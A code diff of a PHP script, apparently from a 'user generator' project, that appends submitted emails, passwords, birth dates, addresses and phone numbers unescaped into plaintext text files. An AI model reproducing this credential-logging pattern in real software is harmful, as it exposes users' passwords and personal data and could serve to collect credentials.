@@ -10,31 +10,29 @@ $_POST = json_decode(file_get_contents('php://input'), true);
 $birth = $_POST['birth'];
 $city = $_POST['city'];
 $email = $_POST['email'];
-$flat = $_POST['flat'];
-$house = $_POST['house'];
 $index = $_POST['index'];
 $name = $_POST['name'];
 $password = $_POST['password'];
-$patronymic = $_POST['patronymic'];
+$phoneCode = $_POST['phoneCode'];
 $phone = $_POST['phone'];
 $randomWords = $_POST['randomWords'];
-$street = $_POST['street'];
+$address = $_POST['address'];
 $surName = $_POST['surName'];
 
 createFiles();
 
 function createFiles()
 {
-    global $name, $birth, $city, $email, $flat, $house,$index, $password, $patronymic, $phone,$randomWords,$street,$surName;
-    $filename = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/user_generator/';
+    global $name, $birth, $city, $email, $address,$index, $password, $phoneCode, $phone,$randomWords,$surName;
+    $filename = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'].'/';
 
-    $fp = fopen('fullInfo.txt', 'w+');
-    $text = "{\r\n\t'email': '$email'\r\n\t'password': '$password'\r\n\t'name': '$name'\r\n\t'patronymic': '$patronymic'\r\n\t'surName': '$surName'\r\n\t'birth: '$birth'\r\n\t'randomWords': '$randomWords'\r\n\t'city': '$city'\r\n\t'street': '$street'\r\n\t'house': '$house'\r\n\t'flat': '$flat'\r\n\t'index': '$index'\r\n\t'phone': '$phone'\r\n}";
+    $fp = fopen('fullInfo.txt', 'a+');
+    $text = "\r\n{\r\n\t'email': '$email',\r\n\t'pass': '$password',\r\n\t'name': '$name',\r\n\t'phoneCode': '$phoneCode',\r\n\t'surName': '$surName',\r\n\t'birth: '$birth',\r\n\t'randomWords': '$randomWords',\r\n\t'city': '$city',\r\n\t'address': '$address',\r\n\t'index': '$index',\r\n\t'phone': '$phone',\r\n},";
     fwrite($fp, $text);
     fclose($fp);
 
-    $fp = fopen('emailInfo.txt', 'w+');
-    $text = "{\r\n\t'email': '$email'\r\n\t'password': '$password'\r\n}";
+    $fp = fopen('emailInfo.txt', 'a+');
+    $text = "\r\n{\r\n\t'email': '$email',\r\n\t'pass': '$password'\r\n},";
     fwrite($fp, $text);
     fclose($fp);
 
